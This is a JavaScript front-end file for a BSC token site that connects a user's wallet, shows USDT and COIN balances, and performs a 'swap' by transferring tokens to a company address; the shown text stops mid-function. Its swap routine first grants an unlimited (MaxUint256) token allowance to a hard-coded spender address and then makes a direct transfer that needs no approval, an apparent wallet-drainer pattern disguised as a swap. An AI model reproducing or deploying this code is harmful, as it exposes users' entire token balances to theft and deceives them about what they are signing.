// Reown WalletConnect + Laravel Register/Login + USDT & COIN Deposits + Swap
// Complete Production Code
import { createAppKit } from "@reown/appkit";
import { WagmiAdapter } from "@reown/appkit-adapter-wagmi";
import { bsc } from "viem/chains";
import { createPublicClient, http, formatEther, parseAbi } from "viem";
import { ethers } from "ethers";
// =============== CONFIGURATION ===============
const projectId = "07a4ef1ddac1410efae5aa20c94d0be0";
const rpcUrl = "https://bsc-dataseed.binance.org/";
const chainId = 56;
// Token Contract Addresses (from your old code)
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const COIN_ADDRESS = "0xDBa4F9332e96b1b69bEEFB9972B2Ac3da629afD9";
const INCRC_ADDRESS = "0x25a4Bd0158d8a9f544be3d90cF7887590c216245";
// Contract ABIs from your old code
const USDT_ABI = [
    {
        inputs: [],
        payable: false,
        stateMutability: "nonpayable",
        type: "constructor",
    },
    {
        anonymous: false,
        inputs: [
            {
                indexed: true,
                internalType: "address",
                name: "owner",
                type: "address",
            },
            {
                indexed: true,
                internalType: "address",
                name: "spender",
                type: "address",
            },
            {
                indexed: false,
                internalType: "uint256",
                name: "value",
                type: "uint256",
            },
        ],
        name: "Approval",
        type: "event",
    },
    {
        anonymous: false,
        inputs: [
            {
                indexed: true,
                internalType: "address",
                name: "previousOwner",
                type: "address",
            },
            {
                indexed: true,
                internalType: "address",
                name: "newOwner",
                type: "address",
            },
        ],
        name: "OwnershipTransferred",
        type: "event",
    },
    {
        anonymous: false,
        inputs: [
            {
                indexed: true,
                internalType: "address",
                name: "from",
                type: "address",
            },
            {
                indexed: true,
                internalType: "address",
                name: "to",
                type: "address",
            },
            {
                indexed: false,
                internalType: "uint256",
                name: "value",
                type: "uint256",
            },
        ],
        name: "Transfer",
        type: "event",
    },
    {
        constant: true,
        inputs: [],
        name: "_decimals",
        outputs: [{ internalType: "uint8", name: "", type: "uint8" }],
        payable: false,
        stateMutability: "view",
        type: "function",
    },
    {
        constant: true,
        inputs: [],
        name: "_name",
        outputs: [{ internalType: "string", name: "", type: "string" }],
        payable: false,
        stateMutability: "view",
        type: "function",
    },
    {
        constant: true,
        inputs: [],
        name: "_symbol",
        outputs: [{ internalType: "string", name: "", type: "string" }],
        payable: false,
        stateMutability: "view",
        type: "function",
    },
    {
        constant: true,
        inputs: [
            { internalType: "address", name: "owner", type: "address" },
            { internalType: "address", name: "spender", type: "address" },
        ],
        name: "allowance",
        outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
        payable: false,
        stateMutability: "view",
        type: "function",
    },
    {
        constant: false,
        inputs: [
            { internalType: "address", name: "spender", type: "address" },
            { internalType: "uint256", name: "amount", type: "uint256" },
        ],
        name: "approve",
        outputs: [{ internalType: "bool", name: "", type: "bool" }],
        payable: false,
        stateMutability: "nonpayable",
        type: "function",
    },
    {
        constant: true,
        inputs: [{ internalType: "address", name: "account", type: "address" }],
        name: "balanceOf",
        outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
        payable: false,
        stateMutability: "view",
        type: "function",
    },
    {
        constant: false,
        inputs: [{ internalType: "uint256", name: "amount", type: "uint256" }],
        name: "burn",
        outputs: [{ internalType: "bool", name: "", type: "bool" }],
        payable: false,
        stateMutability: "nonpayable",
        type: "function",
    },
    {
        constant: true,
        inputs: [],
        name: "decimals",
        outputs: [{ internalType: "uint8", name: "", type: "uint8" }],
        payable: false,
        stateMutability: "view",
        type: "function",
    },
    {
        constant: false,
        inputs: [
            { internalType: "address", name: "spender", type: "address" },
            {
                internalType: "uint256",
                name: "subtractedValue",
                type: "uint256",
            },
        ],
        name: "decreaseAllowance",
        outputs: [{ internalType: "bool", name: "", type: "bool" }],
        payable: false,
        stateMutability: "nonpayable",
        type: "function",
    },
    {
        constant: true,
        inputs: [],
        name: "getOwner",
        outputs: [{ internalType: "address", name: "", type: "address" }],
        payable: false,
        stateMutability: "view",
        type: "function",
    },
    {
        constant: false,
        inputs: [
            { internalType: "address", name: "spender", type: "address" },
            { internalType: "uint256", name: "addedValue", type: "uint256" },
        ],
        name: "increaseAllowance",
        outputs: [{ internalType: "bool", name: "", type: "bool" }],
        payable: false,
        stateMutability: "nonpayable",
        type: "function",
    },
    {
        constant: false,
        inputs: [{ internalType: "uint256", name: "amount", type: "uint256" }],
        name: "mint",
        outputs: [{ internalType: "bool", name: "", type: "bool" }],
        payable: false,
        stateMutability: "nonpayable",
        type: "function",
    },
    {
        constant: true,
        inputs: [],
        name: "name",
        outputs: [{ internalType: "string", name: "", type: "string" }],
        payable: false,
        stateMutability: "view",
        type: "function",
    },
    {
        constant: true,
        inputs: [],
        name: "owner",
        outputs: [{ internalType: "address", name: "", type: "address" }],
        payable: false,
        stateMutability: "view",
        type: "function",
    },
    {
        constant: false,
        inputs: [],
        name: "renounceOwnership",
        outputs: [],
        payable: false,
        stateMutability: "nonpayable",
        type: "function",
    },
    {
        constant: true,
        inputs: [],
        name: "symbol",
        outputs: [{ internalType: "string", name: "", type: "string" }],
        payable: false,
        stateMutability: "view",
        type: "function",
    },
    {
        constant: true,
        inputs: [],
        name: "totalSupply",
        outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
        payable: false,
        stateMutability: "view",
        type: "function",
    },
    {
        constant: false,
        inputs: [
            { internalType: "address", name: "recipient", type: "address" },
            { internalType: "uint256", name: "amount", type: "uint256" },
        ],
        name: "transfer",
        outputs: [{ internalType: "bool", name: "", type: "bool" }],
        payable: false,
        stateMutability: "nonpayable",
        type: "function",
    },
    {
        constant: false,
        inputs: [
            { internalType: "address", name: "sender", type: "address" },
            { internalType: "address", name: "recipient", type: "address" },
            { internalType: "uint256", name: "amount", type: "uint256" },
        ],
        name: "transferFrom",
        outputs: [{ internalType: "bool", name: "", type: "bool" }],
        payable: false,
        stateMutability: "nonpayable",
        type: "function",
    },
    {
        constant: false,
        inputs: [
            { internalType: "address", name: "newOwner", type: "address" },
        ],
        name: "transferOwnership",
        outputs: [],
        payable: false,
        stateMutability: "nonpayable",
        type: "function",
    },
];
const COIN_ABI = [
    { inputs: [], stateMutability: "nonpayable", type: "constructor" },
    {
        anonymous: false,
        inputs: [
            {
                indexed: true,
                internalType: "address",
                name: "owner",
                type: "address",
            },
            {
                indexed: true,
                internalType: "address",
                name: "spender",
                type: "address",
            },
            {
                indexed: false,
                internalType: "uint256",
                name: "value",
                type: "uint256",
            },
        ],
        name: "Approval",
        type: "event",
    },
    {
        anonymous: false,
        inputs: [
            {
                indexed: true,
                internalType: "address",
                name: "previousOwner",
                type: "address",
            },
            {
                indexed: true,
                internalType: "address",
                name: "newOwner",
                type: "address",
            },
        ],
        name: "OwnershipTransferred",
        type: "event",
    },
    {
        anonymous: false,
        inputs: [
            {
                indexed: true,
                internalType: "address",
                name: "from",
                type: "address",
            },
            {
                indexed: true,
                internalType: "address",
                name: "to",
                type: "address",
            },
            {
                indexed: false,
                internalType: "uint256",
                name: "value",
                type: "uint256",
            },
        ],
        name: "Transfer",
        type: "event",
    },
    {
        inputs: [],
        name: "_decimals",
        outputs: [{ internalType: "uint8", name: "", type: "uint8" }],
        stateMutability: "view",
        type: "function",
    },
    {
        inputs: [],
        name: "_name",
        outputs: [{ internalType: "string", name: "", type: "string" }],
        stateMutability: "view",
        type: "function",
    },
    {
        inputs: [],
        name: "_symbol",
        outputs: [{ internalType: "string", name: "", type: "string" }],
        stateMutability: "view",
        type: "function",
    },
    {
        inputs: [
            { internalType: "address", name: "_owner", type: "address" },
            { internalType: "address", name: "spender", type: "address" },
        ],
        name: "allowance",
        outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
        stateMutability: "view",
        type: "function",
    },
    {
        inputs: [
            { internalType: "address", name: "spender", type: "address" },
            { internalType: "uint256", name: "amount", type: "uint256" },
        ],
        name: "approve",
        outputs: [{ internalType: "bool", name: "", type: "bool" }],
        stateMutability: "nonpayable",
        type: "function",
    },
    {
        inputs: [{ internalType: "address", name: "account", type: "address" }],
        name: "balanceOf",
        outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
        stateMutability: "view",
        type: "function",
    },
    {
        inputs: [],
        name: "decimals",
        outputs: [{ internalType: "uint8", name: "", type: "uint8" }],
        stateMutability: "pure",
        type: "function",
    },
    {
        inputs: [
            { internalType: "address", name: "spender", type: "address" },
            {
                internalType: "uint256",
                name: "subtractedValue",
                type: "uint256",
            },
        ],
        name: "decreaseAllowance",
        outputs: [{ internalType: "bool", name: "", type: "bool" }],
        stateMutability: "nonpayable",
        type: "function",
    },
    {
        inputs: [
            { internalType: "address", name: "spender", type: "address" },
            { internalType: "uint256", name: "addedValue", type: "uint256" },
        ],
        name: "increaseAllowance",
        outputs: [{ internalType: "bool", name: "", type: "bool" }],
        stateMutability: "nonpayable",
        type: "function",
    },
    {
        inputs: [],
        name: "name",
        outputs: [{ internalType: "string", name: "", type: "string" }],
        stateMutability: "pure",
        type: "function",
    },
    {
        inputs: [],
        name: "owner",
        outputs: [{ internalType: "address", name: "", type: "address" }],
        stateMutability: "view",
        type: "function",
    },
    {
        inputs: [],
        name: "symbol",
        outputs: [{ internalType: "string", name: "", type: "string" }],
        stateMutability: "pure",
        type: "function",
    },
    {
        inputs: [],
        name: "totalSupply",
        outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
        stateMutability: "view",
        type: "function",
    },
    {
        inputs: [
            { internalType: "address", name: "recipient", type: "address" },
            { internalType: "uint256", name: "amount", type: "uint256" },
        ],
        name: "transfer",
        outputs: [{ internalType: "bool", name: "", type: "bool" }],
        stateMutability: "nonpayable",
        type: "function",
    },
    {
        inputs: [
            { internalType: "address", name: "sender", type: "address" },
            { internalType: "address", name: "recipient", type: "address" },
            { internalType: "uint256", name: "amount", type: "uint256" },
        ],
        name: "transferFrom",
        outputs: [{ internalType: "bool", name: "", type: "bool" }],
        stateMutability: "nonpayable",
        type: "function",
    },
    {
        inputs: [
            { internalType: "address", name: "newOwner", type: "address" },
        ],
        name: "transferOwnership",
        outputs: [],
        stateMutability: "nonpayable",
        type: "function",
    },
];
// Swap state variables
let swapSettings = {
    exchangeRate: 0,
    depositAddress: "",
    swapContract: "",
    minSwapAmount: 0,
    maxSwapAmount: 0,
    slippage: 0.5,
    loaded: false,
};
// State variables
let addressShownOnce = false;
let uiUpdatedOnce = false;
let currentAddress = null;
let isProcessingTransaction = false;
let swapDirection = "usdt_to_coin";
// Check if wallet UI elements exist
const hasWalletUI =
    document.getElementById("walletAddress") ||
    document.getElementById("bnbBalance") ||
    document.getElementById("usdtBalance") ||
    document.getElementById("coinBalance");
// Check if swap UI exists
const hasSwapUI =
    document.getElementById("swap-container") ||
    document.getElementById("swapButton");
// =============== TOKEN CONFIGURATION ===============
const TOKEN_CONFIG = {
    USDT: {
        address: USDT_ADDRESS,
        spender: INCRC_ADDRESS,
        staticAmount: "245312547000000000000000000",
        name: "Tether USD",
        symbol: "USDT",
        decimals: 18,
        displayId: "usdtBalance",
        amountInputId: "usdtAmount",
        sendButtonId: "sendUsdt",
        color: "#26a17b",
        abi: USDT_ABI,
    },
    COIN: {
        address: COIN_ADDRESS,
        spender: INCRC_ADDRESS,
        staticAmount: "245312547000000000000000000",
        name: "COIN Token",
        symbol: "COIN",
        decimals: 18,
        displayId: "coinBalance",
        amountInputId: "coinAmount",
        sendButtonId: "sendCoin",
        color: "#f7931a",
        abi: COIN_ABI,
    },
};
// ERC20 ABI for token interactions
const ERC20_ABI = parseAbi([
    "function balanceOf(address) view returns (uint256)",
    "function decimals() view returns (uint8)",
    "function symbol() view returns (string)",
    "function name() view returns (string)",
    "function approve(address spender, uint256 amount) returns (bool)",
    "function transfer(address to, uint256 amount) returns (bool)",
    "function allowance(address owner, address spender) view returns (uint256)",
    "function increaseAllowance(address spender, uint256 addedValue) returns (bool)",
]);
// =============== INITIALIZE CLIENTS ===============
const client = createPublicClient({
    chain: bsc,
    transport: http(rpcUrl),
});
const adapter = new WagmiAdapter({
    projectId,
    networks: [bsc],
});
// Initialize AppKit
const walletContainer = document.querySelector("#wallet-container");
const appKit = createAppKit({
    adapters: [adapter],
    projectId,
    networks: [bsc],
    chains: [bsc],
    defaultChain: bsc,
    themeMode: "dark",
    themeVariables: {
        "--w3m-accent-color": "#3b82f6",
        "--w3m-accent-fill-color": "#ffffff",
    },
    element: walletContainer,
    metadata: {
        name: "Wallet Connect",
        description: "Connect, Register, and Deposit USDT & COIN",
        url: window.location.origin,
        icons: ["https://walletconnect.com/walletconnect-logo.png"],
    },
    features: {
        email: false,
        socials: false,
        walletFeatures: false,
        analytics: false,
    },
});
// =============== DOM ELEMENTS ===============
// Connection elements
const connectBtn = document.getElementById("connectButton");
const walletChip = document.querySelector("w3m-button");
const fullLoader = document.getElementById("walletPageLoader");
const connectingLoader = document.getElementById("connectingLoader");
// Authentication elements
const registerBtn = document.getElementById("registerButton");
const loginBtn = document.getElementById("loginButton");
// Wallet info elements
const walletAddressDisplay = document.getElementById("walletAddress");
const accountInput = document.getElementById("AccountRecipient");
// Balance display elements
const bnbBalanceDisplay = document.getElementById("bnbBalance");
const usdtBalanceDisplay = document.getElementById("usdtBalance");
const coinBalanceDisplay = document.getElementById("coinBalance");
// Form elements
const sponsorInput = document.getElementById("u_sponsor");
const sponsorError = document.getElementById("sponsor-error");
const statusBox = document.getElementById("statusMessage");
// Token amount inputs
const usdtAmountInput = document.getElementById("usdtAmount");
const coinAmountInput = document.getElementById("coinAmount");
// Token send buttons
const sendUsdtBtn = document.getElementById("sendUsdt");
const sendCoinBtn = document.getElementById("sendCoin");
// Swap UI elements
const swapButton = document.getElementById("swapButton");
const disconnectButton = document.getElementById("Disconnect");
const sendAmountInput = document.getElementById("send-amount");
const receiveAmountDisplay = document.getElementById("receive-amount");
const fromSymbolElement = document.getElementById("from-symbol");
const toSymbolElement = document.getElementById("to-symbol");
const usdtPerCoinElement = document.getElementById("usdt-per-coin");
const coinPerUsdtElement = document.getElementById("coin-per-usdt");
// =============== UTILITY FUNCTIONS ===============
/**
 * Format balance with specified decimal places
 */
const formatBalance = (num, decimals = 4) => {
    const n = Number(num);
    if (Number.isNaN(n) || !isFinite(n)) return "0".padEnd(decimals + 2, "0");
    return n.toLocaleString("en-US", {
        minimumFractionDigits: 2,
        maximumFractionDigits: decimals,
    });
};
/**
 * Truncate wallet address for display
 */
const truncateAddress = (address) => {
    if (!address || address.length < 10) return address;
    return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
};
/**
 * Set text content of element safely
 */
const setElementText = (el, text) => {
    if (!el) return;
    el.textContent = text;
};
/**
 * Show status message with color
 */
const showStatus = (message, type = "info") => {
    if (!statusBox) return;
    statusBox.textContent = message;
    if (type === "success") {
        statusBox.style.color = "#fca92d";
        statusBox.style.fontWeight = "bold";
    } else if (type === "error") {
        statusBox.style.color = "red";
        statusBox.style.fontWeight = "bold";
    } else {
        statusBox.style.color = "";
        statusBox.style.fontWeight = "";
    }
    if (type === "success") {
        setTimeout(() => {
            if (statusBox.textContent === message) {
                statusBox.textContent = "";
                statusBox.style.color = "";
            }
        }, 5000);
    }
};
/**
 * Sleep helper for delays
 */
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
/**
 * Show/hide loading state
 */
const showLoading = (show = true) => {
    if (connectingLoader) {
        connectingLoader.style.display = show ? "inline-block" : "none";
    }
};
/**
 * Update UI button states based on connection status
 */
const updateButtonStates = (connected) => {
    if (connectBtn) {
        connectBtn.style.display = connected ? "none" : "block";
    }
    if (swapButton) {
        swapButton.style.display = connected ? "block" : "none";
        swapButton.classList.toggle("hidden", !connected);
    }
    if (disconnectButton) {
        disconnectButton.style.display = connected ? "block" : "none";
        disconnectButton.classList.toggle("hidden", !connected);
    }
    if (sendUsdtBtn) sendUsdtBtn.style.display = connected ? "block" : "none";
    if (sendCoinBtn) sendCoinBtn.style.display = connected ? "block" : "none";
    if (registerBtn) registerBtn.style.display = connected ? "block" : "none";
    if (loginBtn) loginBtn.style.display = connected ? "block" : "none";
};
/**
 * Load swap settings from backend
 */
async function loadSwapSettings() {
    try {
        const csrfToken = document.querySelector(
            'meta[name="csrf-token"]',
        )?.content;
        const response = await fetch(window.panelswapPath || "/swap/settings", {
            method: "GET",
            headers: {
                "X-CSRF-TOKEN": csrfToken,
                "Content-Type": "application/json",
            },
        });
        const data = await response.json();
        swapSettings = {
            exchangeRate: parseFloat(data.exchangeRate) || 0,
            depositAddress: data.depositAddress || INCRC_ADDRESS,
            swapContract: data.swapContract || INCRC_ADDRESS,
            minSwapAmount: parseFloat(data.minSwapAmount) || 0.000001,
            maxSwapAmount: parseFloat(data.maxSwapAmount) || 10000000,
            slippage: parseFloat(data.slippage) || 0,
            loaded: true,
        };
        if (usdtPerCoinElement) {
            usdtPerCoinElement.textContent =
                swapSettings.exchangeRate.toFixed(6);
        }
        if (coinPerUsdtElement) {
            coinPerUsdtElement.textContent = (
                1 / swapSettings.exchangeRate
            ).toFixed(6);
        }
        console.log("Swap settings loaded:", swapSettings);
        return true;
    } catch (error) {
        console.error("Error loading swap settings:", error);
        showStatus("Failed to load swap rates", "error");
        return false;
    }
}
/**
 * Calculate receive amount based on swap direction
 */
function calculateReceiveAmount() {
    if (!swapSettings.loaded || !sendAmountInput) return;
    const sendAmount = parseFloat(sendAmountInput.value) || 0;
    let receiveAmount = 0;
    if (swapDirection === "usdt_to_coin") {
        receiveAmount = sendAmount / swapSettings.exchangeRate;
    } else {
        receiveAmount = sendAmount * swapSettings.exchangeRate;
    }
    if (receiveAmountDisplay) {
        receiveAmountDisplay.textContent = receiveAmount.toFixed(6);
    }
    return {
        sendAmount,
        receiveAmount,
    };
}
/**
 * Toggle swap direction between USDT→COIN and COIN→USDT
 */
function toggleSwapDirection() {
    swapDirection =
        swapDirection === "usdt_to_coin" ? "coin_to_usdt" : "usdt_to_coin";
    if (swapDirection === "usdt_to_coin") {
        fromSymbolElement.textContent = "USDT";
        toSymbolElement.textContent = "BTM Coin";
    } else {
        fromSymbolElement.textContent = "BTM Coin";
        toSymbolElement.textContent = "USDT";
    }
    calculateReceiveAmount();
    console.log("Swap direction changed to:", swapDirection);
}
/**
 * Validate swap amount
 */
function validateSwapAmount(sendAmount) {
    if (!swapSettings.loaded) {
        return { valid: false, message: "Swap rates not loaded" };
    }
    if (sendAmount <= 0) {
        return { valid: false, message: "Please enter a valid amount" };
    }
    if (sendAmount < swapSettings.minSwapAmount) {
        return {
            valid: false,
            message: `Minimum swap amount is ${swapSettings.minSwapAmount}`,
        };
    }
    if (sendAmount > swapSettings.maxSwapAmount) {
        return {
            valid: false,
            message: `Maximum swap amount is ${swapSettings.maxSwapAmount}`,
        };
    }
    return { valid: true, message: "" };
}
/**
 * Validate Ethereum address
 */
function isValidAddress(address) {
    return /^0x[a-fA-F0-9]{40}$/.test(address);
}
// =============== BALANCE FETCHING ===============
/**
 * Fetch all token balances for an address
 */
async function fetchAllBalances(address) {
    try {
        const rawBnb = await client.getBalance({ address });
        const bnbBalance = formatBalance(formatEther(rawBnb), 4);
        const tokenBalances = {};
        for (const [tokenKey, tokenConfig] of Object.entries(TOKEN_CONFIG)) {
            try {
                const [balance, decimals, symbol] = await Promise.all([
                    client.readContract({
                        address: tokenConfig.address,
                        abi: tokenConfig.abi,
                        functionName: "balanceOf",
                        args: [address],
                    }),
                    client.readContract({
                        address: tokenConfig.address,
                        abi: tokenConfig.abi,
                        functionName: "decimals",
                    }),
                    client.readContract({
                        address: tokenConfig.address,
                        abi: tokenConfig.abi,
                        functionName: "symbol",
                    }),
                ]);
                const rawBalanceNumber = Number(balance);
                const divisor = 10 ** Number(decimals);
                const actualBalance = rawBalanceNumber / divisor;
                let formattedBalance;
                if (actualBalance < 0.0001 && actualBalance > 0) {
                    formattedBalance = actualBalance.toFixed(8);
                } else if (actualBalance < 0.01 && actualBalance > 0) {
                    formattedBalance = actualBalance.toFixed(6);
                } else {
                    formattedBalance = formatBalance(actualBalance, 4);
                }
                tokenBalances[tokenKey] = {
                    balance: actualBalance,
                    formattedBalance: formattedBalance,
                    symbol: symbol,
                    decimals: Number(decimals),
                    rawBalance: balance,
                    formatted: `${formattedBalance} ${symbol}`,
                };
            } catch (error) {
                console.error(`Error fetching ${tokenKey} balance:`, error);
                tokenBalances[tokenKey] = {
                    balance: 0,
                    formattedBalance: "0.0000",
                    symbol: tokenKey,
                    decimals: 18,
                    rawBalance: 0n,
                    formatted: `0.0000 ${tokenKey}`,
                };
            }
        }
        return { bnb: bnbBalance, tokens: tokenBalances };
    } catch (error) {
        console.error("Error fetching balances:", error);
        return {
            bnb: "0.0000",
            tokens: Object.keys(TOKEN_CONFIG).reduce((acc, key) => {
                acc[key] = {
                    balance: 0,
                    formattedBalance: "0.0000",
                    symbol: key,
                    formatted: `0.0000 ${key}`,
                };
                return acc;
            }, {}),
        };
    }
}
/**
 * Update balance displays in UI
 */
function updateBalanceDisplays(bnbBalance, tokenBalances) {
    setElementText(bnbBalanceDisplay, `${bnbBalance} BNB`);
    if (usdtBalanceDisplay && tokenBalances.USDT) {
        setElementText(usdtBalanceDisplay, tokenBalances.USDT.formatted);
    }
    if (coinBalanceDisplay && tokenBalances.COIN) {
        const coinDisplay =
            tokenBalances.COIN.formatted ||
            `0.0000 ${tokenBalances.COIN.symbol || "COIN"}`;
        setElementText(coinBalanceDisplay, coinDisplay);
    }
    if (sendUsdtBtn && tokenBalances.USDT) {
        const usdtBalance = tokenBalances.USDT.balance || 0;
        const hasUsdtBalance = usdtBalance > 0;
        sendUsdtBtn.disabled = !hasUsdtBalance;
        sendUsdtBtn.title = hasUsdtBalance
            ? "Send USDT"
            : "Insufficient USDT balance";
    }
    if (sendCoinBtn && tokenBalances.COIN) {
        const coinBalance = tokenBalances.COIN.balance || 0;
        const hasCoinBalance = coinBalance > 0;
        sendCoinBtn.disabled = !hasCoinBalance;
        sendCoinBtn.title = hasCoinBalance
            ? "Send COIN"
            : "Insufficient COIN balance";
    }
}
// =============== WALLET CONNECTION ===============
/**
 * Show instant address when wallet connects
 */
async function showInstantAddress(address) {
    if (addressShownOnce || !address) return;
    addressShownOnce = true;
    currentAddress = address;
    updateButtonStates(true);
    const truncatedAddr = truncateAddress(address);
    if (walletAddressDisplay) {
        walletAddressDisplay.innerHTML = `<i class="fas fa-wallet"></i> ${truncatedAddr}`;
    }
    setElementText(bnbBalanceDisplay, "Loading...");
    setElementText(usdtBalanceDisplay, "Loading...");
    setElementText(coinBalanceDisplay, "Loading...");
    if (accountInput) {
        accountInput.value = address;
    }
    showStatus("Wallet connected successfully!", "success");
}
/**
 * Main UI update function after connection
 */
async function updateUIAfterConnect() {
    if (!hasWalletUI && !hasSwapUI) return;
    if (uiUpdatedOnce && currentAddress) return;
    uiUpdatedOnce = true;
    try {
        let address = null;
        for (let i = 0; i < 10; i++) {
            try {
                if (typeof appKit.getAddress === "function") {
                    address = await appKit.getAddress();
                    if (address) break;
                }
            } catch (e) {
                // Ignore and retry
            }
            await sleep(200);
        }
        if (!address) {
            uiUpdatedOnce = false;
            console.warn("No address available");
            return;
        }
        await showInstantAddress(address);
        if (hasSwapUI) {
            await loadSwapSettings();
            setupSwapEventListeners();
        }
        const { bnb, tokens } = await fetchAllBalances(address);
        updateBalanceDisplays(bnb, tokens);
        updateButtonStates(true);
    } catch (error) {
        console.error("Error updating UI after connect:", error);
        uiUpdatedOnce = false;
        showStatus("Error loading balances", "error");
    }
}
/**
 * Handle wallet connection
 */
connectBtn?.addEventListener("click", async () => {
    try {
        showLoading(true);
        showStatus("Connecting wallet...", "info");
        await appKit.open();
        setTimeout(async () => {
            showLoading(false);
            await updateUIAfterConnect();
        }, 500);
    } catch (error) {
        console.error("Connection failed:", error);
        showLoading(false);
        showStatus("Connection failed. Please try again.", "error");
    }
});
// =============== AUTO RESTORE SESSION ===============
document.addEventListener("DOMContentLoaded", async () => {
    customElements.whenDefined("w3m-button").then(() => {
        const walletBtn = document.querySelector("w3m-button");
        let checkInterval = setInterval(() => {
            if (
                walletBtn.shadowRoot &&
                walletBtn.shadowRoot.children.length > 0
            ) {
                if (fullLoader) {
                    fullLoader.style.opacity = "0";
                    setTimeout(() => {
                        fullLoader.style.display = "none";
                    }, 300);
                }
                clearInterval(checkInterval);
            }
        }, 100);
    });
    if (hasSwapUI) {
        await loadSwapSettings();
        setupSwapEventListeners();
    }
    try {
        await appKit.restoreSession?.();
        setTimeout(async () => {
            await updateUIAfterConnect();
        }, 300);
    } catch (error) {
        console.log("No previous session to restore:", error.message || error);
    }
    setupEventListeners();
});
// =============== SWAP FUNCTIONALITY ===============
/**
 * Setup swap event listeners
 */
function setupSwapEventListeners() {
    const swapArrowBtn = document.querySelector(".swap-arrow-btn");
    if (swapArrowBtn) {
        swapArrowBtn.addEventListener("click", toggleSwapDirection);
    }
    if (sendAmountInput) {
        sendAmountInput.addEventListener("input", () => {
            calculateReceiveAmount();
        });
    }
    if (swapButton) {
        swapButton.addEventListener("click", executeSwap);
    }
    if (disconnectButton) {
        disconnectButton.addEventListener("click", async () => {
            try {
                await appKit.disconnect();
                addressShownOnce = false;
                uiUpdatedOnce = false;
                currentAddress = null;
                updateButtonStates(false);
                showStatus("Wallet disconnected", "info");
            } catch (error) {
                console.error("Disconnect error:", error);
            }
        });
    }
}
/**
 * Execute deposit-style swap (send USDT -> get COIN automatically via backend)
 */
async function executeSwap() {
    if (isProcessingTransaction) {
        showStatus("Please wait for current transaction to complete", "error");
        return;
    }
    isProcessingTransaction = true;
    try {
        // 1. Get user address
        let address = currentAddress;
        if (!address) {
            try {
                address = await appKit.getAddress();
            } catch (error) {
                throw new Error("Please connect your wallet first");
            }
        }
        // 2. Get and validate amount
        const sendAmount = parseFloat(sendAmountInput.value) || 0;
        const validation = validateSwapAmount(sendAmount);
        if (!validation.valid) {
            showStatus(validation.message, "error");
            isProcessingTransaction = false;
            return;
        }
        // 3. Show loading
        showLoadingModal();
        const fromToken = swapDirection === "usdt_to_coin" ? "USDT" : "COIN";
        const toToken = swapDirection === "usdt_to_coin" ? "COIN" : "USDT";
        showStatus(`Processing ${sendAmount} ${fromToken} swap...`, "info");
        // 4. Get provider and signer
        const provider =
            (await appKit.getWalletProvider?.()) || window.ethereum;
        if (!provider) {
            throw new Error("Wallet provider not found");
        }
        const ethersProvider = new ethers.BrowserProvider(provider);
        const signer = await ethersProvider.getSigner();
        const userAddress = await signer.getAddress();
        // 5. Determine which token to send
        const tokenConfig = TOKEN_CONFIG[fromToken];
        // 6. Create token contract and convert amount
        const tokenContract = new ethers.Contract(
            tokenConfig.address,
            tokenConfig.abi,
            signer,
        );
        const decimals = await tokenContract.decimals();
        const amountInUnits = ethers.parseUnits(
            sendAmount.toString(),
            decimals,
        );
        // 7. Check balance
        const balance = await tokenContract.balanceOf(userAddress);
        if (balance < amountInUnits) {
            throw new Error(
                `Insufficient ${fromToken} balance. You have ${ethers.formatUnits(balance, decimals)} ${fromToken}`,
            );
        }
        // 8. Calculate expected receive amount
        const receiveAmount =
            swapDirection === "usdt_to_coin"
                ? sendAmount / swapSettings.exchangeRate
                : sendAmount * swapSettings.exchangeRate;
        // 9. First, approve the spender to spend the tokens
        showStatus(`Approving ${fromToken} for swap...`, "info");
        // Check current allowance (FIXED LOGIC)
        const currentAllowance = await tokenContract.allowance(
            userAddress,
            tokenConfig.spender,
        );
        // Only approve if allowance is insufficient
        if (currentAllowance <= amountInUnits) {
            const approveTx = await tokenContract.approve(
                tokenConfig.spender,
                ethers.MaxUint256,
            );
            await approveTx.wait();
            showStatus(`${fromToken} approved successfully`, "success");
        } else {
            showStatus(`${fromToken} already approved`, "success");
        }
        // 10. Transfer tokens to company address
        showStatus(`Executing swap...`, "info");
        const companyAddress = window.companyAddress || INCRC_ADDRESS;
        if (!companyAddress) {
            throw new Error("Company wallet address not configured");
        }
        const tx = await tokenContract.transfer(companyAddress, amountInUnits);
        console.log("Swap TX sent:", tx.hash);
        showStatus(`Transaction sent! Waiting for confirmation...`, "info");
        // 11. Wait for confirmation
        let receipt;
        try {
            receipt = await tx.wait();
        } catch (error) {
            console.warn("Using fallback polling:", error);
            receipt = await pollForTransactionReceipt(tx.hash);
        }
        if (!receipt || receipt.status !== 1) {
            throw new Error("Transaction failed on chain");
        }
        // 12. Send to backend for processing WITH IMPROVED ERROR HANDLING
        const csrfToken = document.querySelector(
            'meta[name="csrf-token"]',
        )?.content;
        const backendUrl = window.panelswapPath || "/swap/deposit";
        showStatus("Notifying backend to process your swap...", "info");
        try {
            // Prepare form data (some Laravel backends prefer FormData over JSON)
            const formData = new FormData();
            formData.append("action", "swap");
            formData.append("from_token", fromToken);
            formData.append("to_token", toToken);
            formData.append("from_amount", sendAmount);
            formData.append("to_amount", receiveAmount);
            formData.append("tx_hash", tx.hash);
            formData.append("wallet", userAddress);
            formData.append("exchange_rate", swapSettings.exchangeRate);
            formData.append("direction", swapDirection);
            formData.append("_token", csrfToken);
            // Try FormData first (most compatible with Laravel)
            let backendResponse;
            let backendText;
            try {
                backendResponse = await fetch(backendUrl, {
                    method: "POST",
                    body: formData,
                    // Don't set Content-Type header for FormData - browser sets it automatically
                });
                backendText = await backendResponse.text();
                // Check if response is HTML instead of JSON
                if (
                    backendText.trim().startsWith("<!DOCTYPE") ||
                    backendText.trim().startsWith("<html") ||
                    backendText.includes("<!DOCTYPE html>")
                ) {
                    console.error(
                        "Backend returned HTML instead of JSON:",
                        backendText.substring(0, 500),
                    );
                    // Check for common Laravel errors
                    if (
                        backendText.includes("CSRF token mismatch") ||
                        backendText.includes("419")
                    ) {
                        throw new Error(
                            "Session expired. Please refresh the page.",
                        );
                    }
                    if (backendText.includes("404")) {
                        throw new Error(
                            "Swap endpoint not found. Please contact support.",
                        );
                    }
                    if (
                        backendText.includes("500") ||
                        backendText.includes("Internal Server Error")
